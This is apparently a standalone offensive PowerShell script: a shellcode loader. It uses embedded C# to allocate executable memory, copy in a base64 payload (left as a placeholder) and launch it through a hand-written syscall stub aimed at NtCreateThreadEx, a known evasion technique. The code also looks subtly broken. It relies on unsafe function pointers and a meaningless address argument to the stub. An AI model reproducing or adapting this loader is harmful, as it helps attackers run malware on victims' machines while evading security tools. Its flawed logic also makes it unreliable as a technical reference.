$IndirectSyscall = @"
using System;
using System.Runtime.InteropServices;

public class Syscall
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static unsafe IntPtr InvokeSyscall(byte[] syscall, IntPtr pTargetFunc, IntPtr pShellcode, uint size)
    {
        IntPtr pSyscall = VirtualAlloc(IntPtr.Zero, (uint)syscall.Length, 0x3000, 0x40);
        Marshal.Copy(syscall, 0, pSyscall, syscall.Length);

        uint oldProtect;
        VirtualProtect(pSyscall, (UIntPtr)syscall.Length, 0x20, out oldProtect);

        delegate* unmanaged<IntPtr, IntPtr, uint, IntPtr> syscallDelegate = (delegate* unmanaged<IntPtr, IntPtr, uint, IntPtr>)pSyscall;
        return syscallDelegate(pTargetFunc, pShellcode, size);
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
"@

Add-Type -TypeDefinition $IndirectSyscall -PassThru

$shellcode = [System.Convert]::FromBase64String("Encoded Shellcode Shit here (payload)")

$size = $shellcode.Length
$ptr = [Syscall]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $size)

$ntdll = [Syscall]::GetModuleHandle("ntdll.dll")
$syscallAddress = [Syscall]::GetProcAddress($ntdll, "NtCreateThreadEx")

# i used gpt for this part because i got really stuck (lmao sorry guys)
$syscallStub = @(
    0x4C, 0x8B, 0xD1,                 # mov r10, rcx
    0xB8, 0x55, 0x00, 0x00, 0x00,     # mov eax, 0x55 (Replace 0x55 with desired syscall number)
    0x0F, 0x05,                       # syscall
    0xC3                              # ret
)

[Syscall]::InvokeSyscall($syscallStub, $syscallAddress, $ptr, $size)
